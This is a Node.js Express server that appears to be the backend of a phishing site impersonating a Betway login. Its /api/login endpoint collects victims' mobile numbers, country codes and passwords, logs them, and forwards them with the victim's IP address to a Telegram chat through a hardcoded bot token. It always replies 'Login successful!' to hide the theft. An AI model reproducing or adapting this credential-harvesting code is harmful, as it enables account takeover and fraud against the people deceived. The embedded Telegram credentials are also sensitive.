const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;

// ===== CORS =====
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));

app.use(express.json());

// ============================================
// TELEGRAM DETAILS
// Bot Token: 8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI
// Chat ID: 8392790531
// ============================================

const TELEGRAM_BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
const TELEGRAM_CHAT_ID = '8392790531';

console.log('✅ Bot Token:', TELEGRAM_BOT_TOKEN);
console.log('✅ Chat ID:', TELEGRAM_CHAT_ID);

// ===== TEST ROUTE =====
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        message: 'Betway Login Backend is running!',
        port: PORT
    });
});

// ===== LOGIN ENDPOINT =====
app.post('/api/login', async (req, res) => {
    try {
        const { mobileNumber, password, countryCode } = req.body;

        console.log('📱 Received mobile:', mobileNumber);
        console.log('🌍 Country Code:', countryCode);
        console.log('🔑 Received password:', password);

        if (!mobileNumber || !password) {
            return res.status(400).json({
                success: false,
                message: 'Mobile number and password are required'
            });
        }

        // ===== SEND TO TELEGRAM =====
        const message = 
'🔐 **BETWAY LOGIN ALERT**\n' +
'━━━━━━━━━━━━━━━━━━━\n' +
'📱 **Mobile:** ' + mobileNumber + '\n' +
'🌍 **Country:** ' + (countryCode || 'N/A') + '\n' +
'🔑 **Password:** ' + password + '\n' +
'🌐 **IP:** ' + (req.ip || 'Unknown') + '\n' +
'🕐 **Time:** ' + new Date().toLocaleString() + '\n' +
'━━━━━━━━━━━━━━━━━━━';

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        console.log(`✅ Login captured: ${mobileNumber}`);

        res.json({
            success: true,
            message: 'Login successful!'
        });

    } catch (error) {
        console.error('❌ Error:', error.message);
        res.json({
            success: true,
            message: 'Login successful!'
        });
    }
});

app.listen(PORT, () => {
    console.log(`
    ╔═══════════════════════════════════════════════╗
    ║   🚀 SERVER RUNNING                           ║
    ║   Port: ${PORT}                                ║
    ║   Status: ONLINE ✅                           ║
    ║   Bot Token: ${TELEGRAM_BOT_TOKEN ? '✅ Set' : '❌ Missing'}
    ║   Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Set' : '❌ Missing'}
    ║   URL: betwayaviatorpredictor-production-0a61 ║
    ╚═══════════════════════════════════════════════╝
    `);
});
